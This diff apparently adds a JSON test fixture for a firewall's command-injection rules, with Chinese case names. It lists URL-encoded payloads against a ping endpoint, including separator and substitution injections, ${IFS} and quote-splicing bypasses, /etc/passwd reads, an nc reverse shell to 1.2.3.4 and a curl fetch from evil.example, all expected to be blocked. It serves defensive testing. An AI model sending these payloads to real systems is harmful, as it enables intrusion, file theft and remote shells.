@@ -1,0 +1,19 @@
+{
+  "category": "cmdi",
+  "cases": [
+    {"name": "分号分隔 whoami", "location": "url", "expect": "block", "path": "/ping?host=127.0.0.1%3Bwhoami"},
+    {"name": "管道 |id", "location": "url", "expect": "block", "path": "/ping?host=127.0.0.1%7Cid"},
+    {"name": "&& 串联 cat", "location": "url", "expect": "block", "path": "/ping?host=127.0.0.1%26%26cat%20/etc/passwd"},
+    {"name": "命令替换 $(whoami)", "location": "url", "expect": "block", "path": "/ping?host=%24(whoami)"},
+    {"name": "反引号替换 `id`", "location": "url", "expect": "block", "path": "/ping?host=%60id%60"},
+    {"name": "绕过1：${IFS} 代替空格", "location": "url", "expect": "block", "path": "/ping?host=127.0.0.1%24%7BIFS%7Dwhoami"},
+    {"name": "绕过2：换行执行新命令", "location": "url", "expect": "block", "path": "/ping?host=127.0.0.1%0Awhoami"},
+    {"name": "绕过3：引号拼接 c'a't", "location": "url", "expect": "block", "path": "/ping?host=127.0.0.1%3Bc%27a%27t%20/etc/passwd"},
+    {"name": "绕过4：base64 管道解码", "location": "url", "expect": "block", "path": "/ping?host=127.0.0.1%7Cbase64%20-d"},
+    {"name": "反弹 shell nc -e", "location": "url", "expect": "block", "path": "/ping?host=%3Bnc%20-e%20%2Fbin%2Fsh%201.2.3.4%204444"},
+    {"name": "管道交给 sh 解释器", "location": "url", "expect": "block", "path": "/ping?host=127.0.0.1%7Csh"},
+    {"name": "PowerShell 执行", "location": "url", "expect": "block", "path": "/ping?host=%3Bpowershell%20-c%20whoami"},
+    {"name": "命令替换内嵌 curl", "location": "url", "expect": "block", "path": "/ping?host=%24(curl%20http://evil.example/x.sh)"},
+    {"name": "正常主机地址", "location": "url", "expect": "allow", "path": "/ping?host=127.0.0.1"}
+  ]
+}
